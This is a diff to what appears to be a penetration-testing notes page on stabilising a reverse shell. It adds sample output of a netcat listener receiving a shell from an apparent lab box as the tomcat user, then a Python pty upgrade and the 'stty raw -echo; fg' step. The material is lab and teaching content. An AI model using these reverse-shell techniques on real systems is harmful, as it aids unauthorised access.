@@ -33,14 +33,26 @@ which python
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+```console {class="sample-code"}
+$ rlwrap nc -lvnp 1337 
+listening on [any] 1337 ...
+connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+tomcat@kotarak-dmz:/$ 
+zsh: suspended  rlwrap nc -lvnp 1337
+```
+
 ```console
 # Ctrl-Z to send the process to background, then
 stty raw -echo; fg
 ```
 
-```console
-# After fg, press enter again, then
-export TERM=xterm-256color
+```console {class="sample-code"}
+$ stty raw -echo; fg
+[1]  + continued  rlwrap nc -lvnp 1337
+tomcat@kotarak-dmz:/$ 
 ```
 
 {{< /tabcontent >}}
